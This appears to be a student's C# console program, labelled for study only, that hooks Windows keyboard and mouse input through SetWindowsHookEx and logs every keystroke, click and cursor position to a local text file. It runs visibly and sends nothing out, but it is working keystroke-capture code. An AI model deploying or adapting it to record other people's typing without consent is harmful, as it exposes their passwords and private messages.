using System;
using System.Diagnostics; 
using System.IO; 
using System.Runtime.InteropServices; 
using System.Windows.Forms; 
using Application = System.Windows.Forms.Application; 

class Program
{
    // Các hằng số cho loại hook
    private const int WH_KEYBOARD_LL = 13; // Hook bàn phím cấp thấp
    private const int WH_MOUSE_LL = 14;    // Hook chuột cấp thấp
    private const int WM_KEYDOWN = 0x0100; // Sự kiện nhấn phím
    private const int WM_LBUTTONDOWN = 0x0201; // Sự kiện nhấn chuột trái
    private const int WM_RBUTTONDOWN = 0x0204; // Sự kiện nhấn chuột phải
    private const int WM_MOUSEMOVE = 0x0200;   // Sự kiện di chuyển chuột
    private const int WM_MOUSEWHEEL = 0x020A;  // Sự kiện cuộn chuột

    // Delegate cho hook bàn phím và chuột
    private static LowLevelProc _keyboardProc = KeyboardHookCallback; // Callback cho bàn phím
    private static LowLevelProc _mouseProc = MouseHookCallback;       // Callback cho chuột
    private static IntPtr _keyboardHookID = IntPtr.Zero;              // ID của hook bàn phím
    private static IntPtr _mouseHookID = IntPtr.Zero;                 // ID của hook chuột

    // Định nghĩa kiểu delegate cho callback hook
    private delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);

    // StreamWriter toàn cục để ghi log
    private static StreamWriter logWriter;

    static void Main()
    {
        string logFilePath = string.Empty;

        try
        {
            PrintLogo();

            // Mở file log
            logFilePath = OpenLogFile();

            // Đặt các hook cho bàn phím và chuột
            _keyboardHookID = SetHook(_keyboardProc, WH_KEYBOARD_LL);
            _mouseHookID = SetHook(_mouseProc, WH_MOUSE_LL);

            // Kiểm tra nếu không đặt được hook
            if (_keyboardHookID == IntPtr.Zero || _mouseHookID == IntPtr.Zero)
            {
                Console.WriteLine("Failed to set hooks.");
                return;
            }

            Console.WriteLine($"\nKeymouse Log file saved in path: {logFilePath}");
            Console.WriteLine("\nKeymouse logger is running. Press Ctrl+C to stop.");
            
            Application.Run(); // Chạy ứng dụng chính, giữ chương trình luôn chạy

            // Gỡ bỏ các hook khi thoát
            UnhookWindowsHookEx(_keyboardHookID);
            UnhookWindowsHookEx(_mouseHookID);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }
        finally
        {
            CloseLogFile();
        }
    }

    // Hàm in logo 
    private static void PrintLogo()
    {
        Console.WriteLine("=========================================");
        Console.WriteLine("||     WELCOME TO KEY-MOUSE LOGGER     ||");
        Console.WriteLine("=========================================");
        Console.WriteLine("||                                     ||");
        Console.WriteLine("||  H   H   CCCC   M   M  U   U  SSSS  ||");
        Console.WriteLine("||  H   H  C       MM MM  U   U  S     ||");
        Console.WriteLine("||  HHHHH  C       M M M  U   U  SSS   ||");
        Console.WriteLine("||  H   H  C       M   M  U   U     S  ||");
        Console.WriteLine("||  H   H   CCCC   M   M  UUUUU  SSSS  ||");
        Console.WriteLine("||                                     ||");
        Console.WriteLine("=========================================");
        Console.WriteLine("||           Author: hVie1314          ||");
        Console.WriteLine("||        Only use for studying!       ||");
        Console.WriteLine("=========================================");
    }


    // Hàm tạo và mở file log
    private static string OpenLogFile()
    {
        string filePath = string.Empty;

        try
        {
            string directoryPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Logs"); // Tạo đường dẫn thư mục Logs
            string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss"); // Tạo timestamp
            filePath = Path.Combine(directoryPath, $"keymouse_log_{timestamp}.txt"); // Tạo đường dẫn file log với timestamp

            if (!Directory.Exists(directoryPath))
            {
                Directory.CreateDirectory(directoryPath); // Tạo thư mục nếu chưa có
            }

            logWriter = new StreamWriter(filePath, append: true); // Mở file để ghi log
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to open log file: {ex.Message}");
        }
        return filePath;
    }

    // Hàm đóng file log
    private static void CloseLogFile()
    {
        try
        {
            logWriter?.Close();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to close log file: {ex.Message}");
        }
    }

    // Hàm ghi log vào file
    private static void LogToFile(string text)
    {
        try
        {
            logWriter.WriteLine($"{DateTime.Now}: {text}");
            logWriter.Flush(); // Đảm bảo ghi log ngay lập tức
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to write to log file: {ex.Message}");
        }
    }

    // Hàm thiết lập hook
    private static IntPtr SetHook(LowLevelProc proc, int hookType)
    {
        using var curProcess = Process.GetCurrentProcess();         // Lấy thông tin tiến trình hiện tại
        using var curModule = curProcess.MainModule!;               // Lấy module hiện tại
        IntPtr hookID = SetWindowsHookEx(hookType, proc, GetModuleHandle(curModule.ModuleName), 0); // Đặt hook
        if (hookID == IntPtr.Zero)
        {
            Console.WriteLine($"Failed to set hook for {hookType}. Error: {Marshal.GetLastWin32Error()}");
        }
        return hookID;
    }

    // Callback xử lý sự kiện bàn phím
    private static IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam); // Đọc mã phím được nhấn
            bool shiftPressed = (GetKeyState(0x10) & 0x8000) != 0; // Kiểm tra phím Shift
            bool capsLockOn = (GetKeyState(0x14) & 0x0001) != 0;  // Kiểm tra Caps Lock

            string key = ConvertKey(vkCode, shiftPressed, capsLockOn); // Chuyển mã phím thành ký tự
            Console.WriteLine($"Key Pressed: {key}");
            LogToFile($"Key Pressed: {key}"); // Ghi log phím nhấn
        }
        return CallNextHookEx(_keyboardHookID, nCode, wParam, lParam); // Gọi tiếp hook tiếp theo
    }

    // Callback xử lý sự kiện chuột
    private static IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0)
        {
            switch (wParam.ToInt32())
            {
                case WM_LBUTTONDOWN:
                    Console.WriteLine("Mouse Left Button Clicked");
                    LogToFile("Mouse Left Button Clicked");
                    break;

                case WM_RBUTTONDOWN:
                    Console.WriteLine("Mouse Right Button Clicked");
                    LogToFile("Mouse Right Button Clicked");
                    break;

                case WM_MOUSEMOVE:
                    var mouseStruct = Marshal.PtrToStructure<MSLLHOOKSTRUCT>(lParam); // Lấy thông tin di chuyển
                    Console.WriteLine($"Mouse Moved: X={mouseStruct.pt.x}, Y={mouseStruct.pt.y}");
                    LogToFile($"Mouse Moved: X={mouseStruct.pt.x}, Y={mouseStruct.pt.y}");
                    break;

                case WM_MOUSEWHEEL:
                    Console.WriteLine("Mouse Wheel Scrolled");
                    LogToFile("Mouse Wheel Scrolled");
                    break;
            }
        }
        return CallNextHookEx(_mouseHookID, nCode, wParam, lParam); // Gọi tiếp hook tiếp theo
    }

    // Hàm chuyển mã phím thành ký tự
    private static string ConvertKey(int vkCode, bool shiftPressed, bool capsLockOn)
    {
        Keys key = (Keys)vkCode; // Ép kiểu mã phím thành Keys enum

        // Xử lý ký tự chữ cái
        if (key >= Keys.A && key <= Keys.Z)
        {
            bool isUpperCase = shiftPressed ^ capsLockOn; // XOR giữa Shift và Caps Lock
            return isUpperCase ? key.ToString() : key.ToString().ToLower();
        }

        // Xử lý phím số và ký tự đặc biệt
        if (key >= Keys.D0 && key <= Keys.D9)
        {
            if (shiftPressed)
            {
                string[] specialChars = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };
                return specialChars[key - Keys.D0];
            }
            return (key - Keys.D0).ToString();
        }

        // Xử lý các phím chức năng
        return key switch
        {
            Keys.Space => "[Space]",
            Keys.Enter => "[Enter]",
            Keys.Back => "[Backspace]",
            Keys.Tab => "[Tab]",
            Keys.Alt => "[Alt]",
            Keys.ControlKey => "[Ctrl]",
            Keys.Escape => "[Escape]",
            _ => key.ToString(),
        };
    }

    // Import các hàm API từ Windows
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern short GetKeyState(int nVirtKey);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    // Struct cho hook chuột
    private struct POINT
    {
        public int x; // Tọa độ X
        public int y; // Tọa độ Y
    }

    private struct MSLLHOOKSTRUCT
    {
        public POINT pt; // Tọa độ chuột
        public uint mouseData; // Dữ liệu chuột
        public uint flags; // Cờ trạng thái
        public uint time; // Thời gian
        public IntPtr dwExtraInfo; // Thông tin bổ sung
    }
}
